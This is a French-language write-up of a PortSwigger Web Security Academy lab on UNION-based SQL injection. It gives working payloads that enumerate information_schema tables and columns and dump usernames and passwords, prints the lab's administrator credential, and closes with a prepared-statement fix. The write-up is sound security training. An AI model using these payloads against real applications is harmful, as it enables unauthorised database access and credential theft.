# 💉 Lab : SQL injection attack, listing the database contents on non-Oracle databases
**Catégorie :** Injection SQL (SQLi)
**Type :** UNION-Based SQLi (Database Schema Enumeration)
**Plateforme :** PortSwigger Web Security Academy

---

## 📌 Résumé de la Vulnérabilité
L'application est vulnérable à une injection SQL de type UNION. Contrairement aux précédents laboratoires où le nom de la table cible était prévisible, les tables et colonnes critiques utilisent ici des suffixes aléatoires. En interrogeant la vue standard `information_schema` (disponible sur MySQL, PostgreSQL et MSSQL), il est possible de cartographier dynamiquement toute la base de données pour localiser et exfiltrer les données sensibles.

## 🛠️ Preuve de Concept (PoC)
L'attaque a été réalisée méthodiquement en 4 phases :

1. **Détermination de la structure :**
   La requête accepte **2 colonnes**, toutes deux compatibles avec le type `texte`.

2. **Énumération des Tables :**
   Pour trouver la table contenant les utilisateurs, l'`information_schema.tables` a été interrogée.
   - **Payload :** `category=Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--`
   - **Résultat :** Identification de la table cible `users_enzlkg`.

3. **Énumération des Colonnes :**
   Une fois la table connue, ses colonnes ont été listées via `information_schema.columns`.
   - **Payload :** `category=Gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_enzlkg'--`
   - **Résultat :** Identification des colonnes `username_ynqnds` et `password_rcirgi`.

4. **Exfiltration des Données (Data Dump) :**
   Grâce au schéma complet, la requête d'exfiltration a pu être construite sur mesure.
   - **Payload :** `category=Gifts' UNION SELECT username_ynqnds, password_rcirgi FROM users_enzlkg--`
   - **Résultat :** Fuite des identifiants administrateur : `administrator` : `neei94wstfauagb2wuw0`

*L'utilisation de ces accès a permis de compromettre le compte administrateur et de valider le challenge.*

## 🛡️ Recommandation de Sécurité
L'application ne devrait jamais faire confiance aux paramètres fournis par l'utilisateur pour construire ses requêtes SQL. Implémenter systématiquement des **requêtes préparées (Prepared Statements)** avec des paramètres liés. Cela rend impossible l'altération de la structure de la requête et bloque tout accès non autorisé à l'`information_schema`.